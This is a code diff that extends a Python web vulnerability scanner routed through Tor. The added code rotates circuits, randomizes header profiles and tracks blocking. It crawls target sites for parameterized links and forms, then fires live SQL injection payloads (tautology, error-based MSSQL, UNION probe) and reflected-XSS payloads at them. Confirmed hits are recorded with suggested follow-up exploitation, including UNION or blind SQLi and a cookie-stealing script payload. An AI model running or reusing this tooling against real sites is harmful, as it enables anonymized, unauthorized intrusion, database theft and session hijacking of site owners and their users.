@@ -406,15 +406,47 @@ class TorSession:
         if shutdown_requested():
             return None
         domain = urlparse(url).netloc
+        if self.is_domain_blocked(domain):
+            return None
         self._delay_for_domain(domain)
         self._maybe_rotate_circuit()
         headers = _pick_profile()
         headers["Content-Type"] = "application/json"
-        kwargs.setdefault("timeout", 25)
+        kwargs.setdefault("timeout", REQUEST_TIMEOUT)
+        self._total_requests += 1
         try:
             self._domain_last[domain] = time.time()
-            return self._session.post(url, json=json_data, headers=headers, **kwargs)
+            resp = self._session.post(url, json=json_data, headers=headers, **kwargs)
+            if resp.status_code in (403, 429, 503):
+                self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
+                self._total_blocks += 1
+            return resp
         except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            self._total_timeouts += 1
+            return None
+
+    def post_form(self, url: str, form_data: dict, **kwargs) -> Optional[requests.Response]:
+        """POST form-encoded data (for testing HTML forms)."""
+        if shutdown_requested():
+            return None
+        domain = urlparse(url).netloc
+        if self.is_domain_blocked(domain):
+            return None
+        self._delay_for_domain(domain)
+        self._maybe_rotate_circuit()
+        headers = _pick_profile()
+        headers["Content-Type"] = "application/x-www-form-urlencoded"
+        kwargs.setdefault("timeout", REQUEST_TIMEOUT)
+        self._total_requests += 1
+        try:
+            self._domain_last[domain] = time.time()
+            resp = self._session.post(url, data=form_data, headers=headers, **kwargs)
+            if resp.status_code in (403, 429, 503):
+                self._domain_blocks[domain] = self._domain_blocks.get(domain, 0) + 1
+                self._total_blocks += 1
+            return resp
+        except (requests.exceptions.Timeout, requests.exceptions.ConnectionError):
+            self._total_timeouts += 1
             return None
 
     def close(self):
@@ -734,6 +766,7 @@ class VulnScanner:
         self._session = session
         self._page_params: List[str] = []
         self._page_forms: List[dict] = []
+        self._crawled_urls: List[dict] = []
 
     def extract_params_from_html(self, html: str, base_url: str):
         """Extract real parameter names from forms, links, and scripts on the page.
@@ -789,6 +822,255 @@ class VulnScanner:
                     break
             return combined
         return fallback[:5]
+
+    def crawl_for_endpoints(self, base_url: str, html: str, depth: int = 1) -> List[dict]:
+        """Crawl the site to discover testable endpoints (URLs with params + forms).
+
+        This is what makes the difference between a useless scanner and one
+        that actually finds vulns: real applications have vulns at specific
+        paths like /search.php?q=, /user.php?id=, not at the homepage.
+
+        Returns list of {url, params: [{name, value}], method, source}.
+        """
+        domain = urlparse(base_url).netloc
+        endpoints: List[dict] = []
+        seen_urls: Set[str] = set()
+        pages_to_crawl: List[str] = [base_url]
+        pages_crawled: Set[str] = set()
+
+        if not HAS_BS4:
+            return endpoints
+
+        def _extract_from_html(page_url: str, page_html: str):
+            """Extract testable endpoints from a single page."""
+            try:
+                soup = BeautifulSoup(page_html[:200000], "html.parser")
+            except Exception:
+                return
+
+            # Extract links with query parameters
+            for tag in soup.find_all("a", href=True):
+                href = tag.get("href", "")
+                if not href or href.startswith(("#", "javascript:", "mailto:")):
+                    continue
+                full_url = urljoin(page_url, href)
+                parsed = urlparse(full_url)
+
+                # Only follow same-domain links
+                if parsed.netloc and parsed.netloc != domain:
+                    continue
+
+                clean_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+                if clean_url not in seen_urls:
+                    seen_urls.add(clean_url)
+                    # Queue for crawling if it looks like a page
+                    if (parsed.path.endswith(('.php', '.asp', '.aspx', '.jsp', '.cgi',
+                                              '.pl', '.py', '/', '.html', '.htm'))
+                            or '.' not in parsed.path.split('/')[-1]):
+                        pages_to_crawl.append(clean_url)
+
+                # If the URL has query params, it's a testable endpoint
+                if parsed.query:
+                    params = parse_qs(parsed.query, keep_blank_values=True)
+                    param_list = [{"name": k, "value": v[0] if v else ""}
+                                  for k, v in params.items()]
+                    if param_list:
+                        endpoints.append({
+                            "url": clean_url,
+                            "params": param_list,
+                            "method": "GET",
+                            "source": "link",
+                        })
+
+            # Extract forms with their action URLs and input parameters
+            for form in soup.find_all("form"):
+                action = form.get("action", "")
+                method = (form.get("method", "GET")).upper()
+                form_url = urljoin(page_url, action) if action else page_url
+
+                parsed = urlparse(form_url)
+                if parsed.netloc and parsed.netloc != domain:
+                    continue
+
+                params = []
+                for inp in form.find_all(["input", "select", "textarea"]):
+                    name = inp.get("name", "")
+                    if not name:
+                        continue
+                    itype = inp.get("type", "text").lower()
+                    if itype in ("submit", "button", "image", "reset", "hidden"):
+                        continue
+                    value = inp.get("value", "test")
+                    params.append({"name": name, "value": value})
+
+                if params:
+                    endpoints.append({
+                        "url": f"{parsed.scheme}://{parsed.netloc}{parsed.path}",
+                        "params": params,
+                        "method": method,
+                        "source": "form",
+                    })
+
+        # Phase 1: extract from the initial page HTML
+        _extract_from_html(base_url, html)
+
+        # Phase 2: crawl discovered pages (1 level deep, max 15 pages)
+        max_crawl = 15
+        crawled = 0
+        while pages_to_crawl and crawled < max_crawl:
+            if shutdown_requested():
+                break
+            if self._session.is_domain_blocked(domain):
+                break
+            page = pages_to_crawl.pop(0)
+            if page in pages_crawled:
+                continue
+            pages_crawled.add(page)
+            if page == base_url:
+                continue  # Already have this HTML
+
+            crawled += 1
+            resp = self._session.get(page, allow_wayback=False)
+            if resp and resp.status_code == 200 and resp.text:
+                _extract_from_html(page, resp.text)
+
+        # Deduplicate: same url+param combo
+        seen_ep = set()
+        unique = []
+        for ep in endpoints:
+            key = f"{ep['method']}:{ep['url']}:{','.join(p['name'] for p in ep['params'])}"
+            if key not in seen_ep:
+                seen_ep.add(key)
+                unique.append(ep)
+
+        self._crawled_urls = unique[:50]
+        return self._crawled_urls
+
+    def _test_endpoint_sqli(self, endpoint: dict) -> List[dict]:
+        """Test a specific endpoint for SQL injection."""
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        for param_info in endpoint["params"][:3]:
+            if shutdown_requested():
+                break
+            pname = param_info["name"]
+            pval = param_info.get("value", "1")
+
+            # Baseline
+            if endpoint["method"] == "GET":
+                baseline_url = f"{url}?{pname}={quote(pval)}"
+                baseline_resp = self._session.get(baseline_url, allow_wayback=False)
+            else:
+                baseline_resp = self._session.post_form(url, {pname: pval})
+            baseline_text = baseline_resp.text[:5000] if baseline_resp else ""
+
+            payloads = [
+                (f"{pval}'", "single quote"),
+                (f"{pval}\"", "double quote"),
+                (f"{pval}' OR '1'='1", "OR tautology"),
+                (f"{pval}' AND 1=CONVERT(int,(SELECT @@version))--", "error-based MSSQL"),
+                (f"{pval}) UNION SELECT NULL--", "UNION probe"),
+            ]
+
+            for payload, desc in payloads:
+                if shutdown_requested():
+                    break
+                if self._session.is_domain_blocked(domain):
+                    break
+
+                if endpoint["method"] == "GET":
+                    test_url = f"{url}?{pname}={quote(payload)}"
+                    resp = self._session.get(test_url, allow_wayback=False)
+                else:
+                    resp = self._session.post_form(url, {pname: payload})
+                    test_url = f"{url} [POST {pname}={payload[:30]}]"
+
+                if resp and resp.text:
+                    for indicator in self.SQLI_INDICATORS:
+                        in_payload = indicator.search(resp.text[:5000])
+                        in_baseline = indicator.search(baseline_text) if baseline_text else False
+                        if in_payload and not in_baseline:
+                            findings.append({
+                                "severity": SEV_CRITICAL,
+                                "title": f"SQL injection via '{pname}' at {urlparse(url).path}",
+                                "detail": f"SQL error from {desc} injection. "
+                                          "Input reaches SQL query without parameterization.",
+                                "evidence": f"URL: {urlparse(url).path}, param: {pname}, "
+                                            f"payload: {desc}, matched: {indicator.pattern[:40]}",
+                                "exploitable": True,
+                                "test_url": test_url if endpoint["method"] == "GET" else url,
+                                "exploit_info": {
+                                    "type": "sqli",
+                                    "parameter": pname,
+                                    "path": urlparse(url).path,
+                                    "method": f"Inject SQL via '{pname}' at {urlparse(url).path}. "
+                                              f"Confirmed with: {desc}. "
+                                              "Try: UNION SELECT, boolean-based blind, time-based blind.",
+                                    "risk": "Database access, data exfiltration, potential RCE",
+                                },
+                            })
+                            return findings
+        return findings
+
+    def _test_endpoint_xss(self, endpoint: dict) -> List[dict]:
+        """Test a specific endpoint for reflected XSS."""
+        findings = []
+        url = endpoint["url"]
+        domain = urlparse(url).netloc
+        if self._session.is_domain_blocked(domain):
+            return findings
+
+        for param_info in endpoint["params"][:3]:
+            if shutdown_requested():
+                break
+            pname = param_info["name"]
+            canary = f"gs{secrets.token_hex(4)}xss"
+
+            # Multiple XSS contexts
+            payloads = [
+                (f"<{canary}>", f"<{canary}>", "HTML tag context"),
+                (f'"{canary}', f'"{canary}', "attribute breakout"),
+                (f"<script>{canary}</script>", f"<script>{canary}</script>", "script injection"),
+                (f"<img src=x onerror={canary}>", canary, "event handler"),
+            ]
+
+            for payload, check_str, desc in payloads:
+                if shutdown_requested() or self._session.is_domain_blocked(domain):
+                    break
+
+                if endpoint["method"] == "GET":
+                    test_url = f"{url}?{pname}={quote(payload)}"
+                    resp = self._session.get(test_url, allow_wayback=False)
+                else:
+                    resp = self._session.post_form(url, {pname: payload})
+                    test_url = f"{url} [POST {pname}]"
+
+                if resp and resp.text and resp.status_code not in (403, 429, 503):
+                    if check_str in resp.text:
+                        findings.append({
+                            "severity": SEV_HIGH,
+                            "title": f"Reflected XSS via '{pname}' at {urlparse(url).path}",
+                            "detail": f"Payload reflected unescaped ({desc}). "
+                                      "Attacker can inject arbitrary JavaScript.",
+                            "evidence": f"URL: {urlparse(url).path}, param: {pname}, context: {desc}",
+                            "exploitable": True,
+                            "test_url": test_url if endpoint["method"] == "GET" else url,
+                            "exploit_info": {
+                                "type": "xss",
+                                "parameter": pname,
+                                "path": urlparse(url).path,
+                                "method": f"Inject via '{pname}' at {urlparse(url).path}. "
+                                          f"Context: {desc}. "
+                                          "Payload: <script>alert(document.cookie)</script>",
+                                "risk": "Session theft, credential capture, client-side attacks",
+                            },
+                        })
+                        return findings
+        return findings
 
     @staticmethod
     def _add_confidence(findings: List[dict], base_confidence: float) -> List[dict]:
@@ -880,18 +1162,68 @@ class VulnScanner:
             self._run_check("open redirect", self._check_open_redirect,
                             (base_url,), 0.85, findings)
 
+            # For full depth: basic SQLi/XSS on base URL (quick probe)
+            if depth == "full":
+                self._run_check("SQL injection (quick)", self._check_sqli_indicators,
+                                (base_url,), 0.85, findings)
+                self._run_check("XSS reflection (quick)", self._check_xss_reflection,
+                                (base_url,), 0.85, findings)
+
         if depth == "deep":
-            # Active exploit checks (network-heavy)
-            self._run_check("SQL injection", self._check_sqli_indicators,
-                            (base_url,), 0.9, findings)
-            self._run_check("XSS reflection", self._check_xss_reflection,
-                            (base_url,), 0.9, findings)
-            self._run_check("directory traversal", self._check_directory_traversal,
-                            (base_url,), 0.95, findings)
+            # Infrastructure checks (against base URL)
             self._run_check("SSL/TLS", self._check_ssl_cert,
                             (base_url,), 0.85, findings)
             self._run_check("GraphQL introspection", self._check_graphql_introspection,
                             (base_url,), 0.95, findings)
+            self._run_check("directory traversal", self._check_directory_traversal,
+                            (base_url,), 0.95, findings)
+
+            # Crawl to discover real endpoints with parameters
+            if html:
+                self._run_check("crawling for endpoints", self.crawl_for_endpoints,
+                                (base_url, html), 0.0, [])
+
+            # Per-endpoint active testing — this is where real vulns are found
+            endpoints = self._crawled_urls
+            if not endpoints:
+                # Fallback: test base URL with discovered/guessed params
+                endpoints = [{"url": base_url, "params": [{"name": p, "value": "1"}
+                              for p in self._get_test_params(["id", "q", "search"])],
+                              "method": "GET", "source": "fallback"}]
+
+            print(f"      testing {len(endpoints)} discovered endpoint(s)...")
+            tested = 0
+            for ep in endpoints[:20]:
+                if shutdown_requested():
+                    break
+                if self._session.is_domain_blocked(urlparse(ep["url"]).netloc):
+                    break
+                tested += 1
+                path = urlparse(ep["url"]).path or "/"
+                params_str = ",".join(p["name"] for p in ep["params"][:3])
+                print(f"        [{tested}] {ep['method']} {path} ({params_str})", end="", flush=True)
+
+                ep_findings = []
+                try:
+                    sqli = self._test_endpoint_sqli(ep)
+                    ep_findings.extend(sqli)
+                except Exception as e:
+                    integrity_log("intel", f"sqli_error:{path}:{type(e).__name__}")
+
+                try:
+                    xss = self._test_endpoint_xss(ep)
+                    ep_findings.extend(xss)
+                except Exception as e:
+                    integrity_log("intel", f"xss_error:{path}:{type(e).__name__}")
+
+                if ep_findings:
+                    self._add_confidence(ep_findings, 0.9)
+                    findings.extend(ep_findings)
+                    print(f" -> {len(ep_findings)} FOUND")
+                else:
+                    print(f" -> clean")
+
+            # Also run SSRF/LFI/cmd injection against base URL with page params
             self._run_check("SSRF", self._check_ssrf_indicators,
                             (base_url,), 0.9, findings)
             self._run_check("LFI", self._check_lfi, (base_url,), 0.95, findings)
